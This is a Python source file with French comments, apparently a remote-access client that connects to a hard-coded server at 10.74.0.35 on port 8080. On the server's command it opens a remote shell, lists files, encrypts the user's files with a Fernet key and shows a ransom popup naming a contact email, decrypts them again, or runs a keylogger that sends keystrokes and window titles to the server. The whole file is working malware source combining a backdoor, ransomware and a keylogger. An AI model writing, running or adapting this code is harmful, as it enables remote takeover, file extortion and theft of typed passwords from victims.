import socket
import subprocess
import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
import pythoncom
import pyHook
import win32gui

# Création d'une socket client
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connexion au serveur
client_socket.connect(('10.74.0.35', 8080))

# Fonction pour afficher un message popup
def show_message_box(message):
    def show_popup():
        messagebox.showinfo("Message", message)

    root = tk.Tk()
    root.title("Fenêtre principale")
    button = tk.Button(root, text="Afficher Message", command=show_popup)
    button.pack(padx=20, pady=20)
    root.mainloop()

# Fonction pour lister les fichiers du répertoire courant
def list_current_files():
    files_list = os.listdir('.')
    return str(files_list)

while True:
    # Recevoir la commande du serveur
    server_command = client_socket.recv(4096).decode('ISO-8859-1')

    if server_command == '1':
        # Exécuter une commande shell et envoyer le résultat au serveur
        while True:
            shell_command = client_socket.recv(4096).decode('ISO-8859-1')
            if shell_command == 'exit':
                client_socket.close()
                break
            command_result = subprocess.run(shell_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            client_socket.send(command_result.stdout)

    elif server_command == '2':
        # Lister les fichiers et envoyer la liste au serveur
        files_list = list_current_files()
        client_socket.send(files_list.encode('ISO-8859-1'))

    elif server_command == '3':
        # Chiffrer les fichiers avec une clé Fernet
        target_files = []
        for file_name in os.listdir():
            if file_name == "client.py" or file_name == "key.key":
                continue
            if os.path.isfile(file_name):
                target_files.append(file_name)

        encryption_key = Fernet.generate_key()
        with open("thekey.key", "wb") as key_file:
            key_file.write(encryption_key)

        for file_name in target_files:
            try:
                with open(file_name, "rb") as file_to_encrypt:
                    file_contents = file_to_encrypt.read()
                encrypted_contents = Fernet(encryption_key).encrypt(file_contents)
                with open(file_name, "wb") as encrypted_file:
                    encrypted_file.write(encrypted_contents)
            except PermissionError:
                pass

        show_message_box("MDR VOUS AVEZ ÉTÉ HACKÉ, CONTACTEZ-NOUS POUR DÉCHIFFRER VOS FICHIERS, HACKERIPSSI@FES.MA A PLUUUS")

    elif server_command == '4':
        # Déchiffrer les fichiers avec la clé Fernet
        target_files = []
        for file_name in os.listdir():
            if file_name == "client.py" or file_name == "thekey.key":
                continue
            if os.path.isfile(file_name):
                target_files.append(file_name)

        with open("thekey.key", "rb") as key_file:
            decryption_key = key_file.read()

        for file_name in target_files:
            try:
                with open(file_name, "rb") as encrypted_file:
                    encrypted_contents = encrypted_file.read()
                decrypted_contents = Fernet(decryption_key).decrypt(encrypted_contents)
                with open(file_name, "wb") as decrypted_file:
                    decrypted_file.write(decrypted_contents)
            except PermissionError:
                pass

        show_message_box("Félicitation, vos fichiers ont été déchiffrés")

    elif server_command == '5':
        # Mise en place d'un keylogger
        captured_data = ''

        def OnKeyboardEvent(event):
            global current_window
            pressed_key = event.Key
            print(event.Key)
            current_cursor = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(current_cursor)

            client_socket.send('hooking Value :' + pressed_key)

            if window_title != current_window:
                current_window = window_title
                client_socket.send('hooking Value :' + window_title)

            return True

        def run_keylogger():
            key_hook_manager = pyHook.HookManager()
            key_hook_manager.KeyDown = OnKeyboardEvent
            key_hook_manager.HookKeyboard()
            pythoncom.PumpMessages()

        run_keylogger()

    elif server_command == 'exit':
        client_socket.close()
        break
